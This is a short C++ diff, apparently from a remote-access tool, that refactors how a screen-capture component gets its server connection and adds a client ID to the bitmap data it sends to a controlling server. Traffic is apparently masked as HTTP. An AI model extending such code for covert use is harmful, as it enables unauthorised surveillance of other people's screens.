@@ -19,6 +19,7 @@
 #include <shlobj_core.h>
 #include "common/file_upload.h"
 #include <thread>
+#include "ClientDll.h"
 
 #pragma comment(lib, "Shlwapi.lib")
 
@@ -86,8 +87,8 @@ bool IsWindows8orHigher()
 CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 #ifndef PLUGIN
-    extern CONNECT_ADDRESS g_SETTINGS;
-    m_conn = &g_SETTINGS;
+    extern ClientApp g_MyApp;
+    m_conn = g_MyApp.g_Connection;
     InitFileUpload("");
 #endif
     m_isGDI = TRUE;
@@ -383,14 +384,15 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 VOID CScreenManager::SendBitMapInfo()
 {
     //这里得到bmp结构的大小
-    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER);
+    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + sizeof(uint64_t);
     LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL,
                                             ulLength, MEM_COMMIT, PAGE_READWRITE);
     if (szBuffer == NULL)
         return;
     szBuffer[0] = TOKEN_BITMAPINFO;
     //这里将bmp位图结构发送出去
-    memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
+    memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), sizeof(BITMAPINFOHEADER));
+    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER), &m_conn->clientID, sizeof(uint64_t));
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
     m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
     VirtualFree(szBuffer, 0, MEM_RELEASE);
